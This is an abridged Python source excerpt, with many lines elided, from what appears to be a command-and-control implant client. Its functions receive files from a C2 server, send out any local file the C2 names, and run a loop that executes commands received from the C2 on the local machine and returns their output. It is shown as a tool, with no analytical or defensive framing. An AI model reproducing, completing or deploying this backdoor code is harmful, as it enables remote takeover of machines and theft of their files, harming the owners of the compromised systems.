...
def recv_file(s, packet) -> bool:
    ...
    try:
        ...
        send_data(s, MT_UP, b'')                                # SIGNAL C2 TO START UPLOAD WITH MT_UP OK PACKET
        ...
        if mem_file_hash == file_hash and file_bytes_recv == file_size:     # IF LOCAL AND REMOTE HASH AND FILE SIZE MATCH THEN WRITE TO DISK AND SEND ACK PACKET TO C2 AND RETURN TRUE
            ...
            send_data(s, MT_UP, local_metadata)
            return True
...
def send_file(s, packet) -> bool:
    ...
    try:
        local_filepath = packet[2].decode('utf-8', errors='replace')
        if not os.path.exists(local_filepath):
            send_data(s, MT_ERR, b'')
            return False
        else:
            ...
            send_data(s, MT_DWN, metadata)                  # SEND LOCAL FILE METADATA TO C2
            ...
            for c in range(0, file_size, chunk_size):       # FOR LOOP TO SEND FILE BYTES IN CHUNKS UNTIL ENTIRE FILE IS SENT
                ...
                chunk_seq += 1
                print(f'+++ FILE {local_filepath} SENT IN {chunk_seq} CHUNKS +++')

            metadata_receipt_packed = recv_packet(s)        # RECEIVE METADATA RECEIPT
            metadata_receipt = metadata_receipt_packed[2]   # UNPACK METADATA RECEIPT
            
            if metadata == metadata_receipt:                # IF LOCAL FILE METADATA AND METADATA RECEIPT MATCH THEN...
                print(f'+++ FILE METADATA MATCH CONFIRMED +++')
                return True
            ...
            while True:                 # INNER WHILE TRUE TRY LOOP FOR COMMAND EXECUTION FLOW         
                try:
                    ...
                    if response[0] == MT_CMD:                                       # LOOKS FOR MT_CMD PACKET
                        ...
                        send_data(s, MT_RECV, run_cmd(response[2].strip()))    # RUNS CMD LOCALLY AND RETURNS OUTPUT TO C2
                        print('SENT MT_RECV')
                        continue
                    
                    elif response[0] == MT_UP:
                        if recv_file(s, response):
                            print(f'FILE RECEIVED: {response[2]}')
                        else: 
                        ...
                        if send_file(s, response):
                            print(f'FILE SENT: {response[2].decode('utf-8', errors='replace')}')
                        else:
